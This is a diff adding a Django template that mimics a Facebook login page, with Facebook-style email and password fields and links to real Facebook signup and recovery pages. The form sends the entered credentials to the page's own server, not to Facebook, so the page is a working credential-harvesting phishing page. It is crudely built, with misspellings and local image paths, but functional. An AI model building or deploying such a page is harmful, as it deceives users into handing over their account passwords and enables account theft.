@@ -1,0 +1,62 @@
+{% load staticfiles %}
+<html>
+<head>
+<title>welcome {{ request.user }}</title>
+<script>
+function checkEmail(inputvalue,passwordvalue){
+    var pattern=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9])+$/;
+    var passw=  /^[A-Za-z0-9]\w{7,14}$/;
+    if((pattern.test(inputvalue))&&(passw.test(passwordvalue))){
+		alert("true");   }
+else{
+		alert("pleas inter correct email address");
+    }
+}
+
+</script>
+</head>
+<body bgcolor="#E6E6FA">
+
+<img src="{% static "download.png" %}"  style="width:1290px;height:100px;">
+
+<center>
+<br>
+<br>
+<br>
+<img src="/home/sonu/Desktop/sp/download(1).png" style="width:600px;height:400px;background-color:white">
+<div  style="margin-left:5px;margin-top:-420px;color:black;font-size:20px;"><h5>Login in to facebook</h5>
+</div>
+
+<form name="signupform" method="POST" action="">
+ <input name="email" type="text" placeholder="Email address or phone number" style="width:300px;height:50px"
+  size="35" maxlength="255"><br>
+<br>
+
+<input name="password" type="text"  placeholder="password"style="width:300px;height:50px;"
+  size="35" maxlength="255"><br>
+
+<input name="summit" type="submit" value="Log in" style="margin-top:30px;width:300px;height:50px;font-size:15px; color:white; background-color:darkblue" onClick="checkEmail(document.signupform.email.value,document.signupform.password.value)">
+</form
+
+
+
+<a href="https://en-gb.facebook.com/login.php?login_attempt=1&lwv=100">
+
+</a>
+
+
+<h5>______________________or______________________</h5>
+
+<a href="https://en-gb.facebook.com/r.php?locale=en_GB&display=page">
+<input type="button" value="Areat new Account" style=" width:180px;height:40px;font-size:15px;color:white;  background-color:green  ">
+</a>
+<br>
+<br>
+<a href="https://www.facebook.com/login/identify?ctx=recover&lwv=110">Forgotten Account?</a>
+<br>
+<br>
+<img src="/home/sonu/Desktop/sp/Footer.png" style="width:1290px;height:100px;margin-top:20px;background-color:white">
+
+</center>
+</body>
+</html>
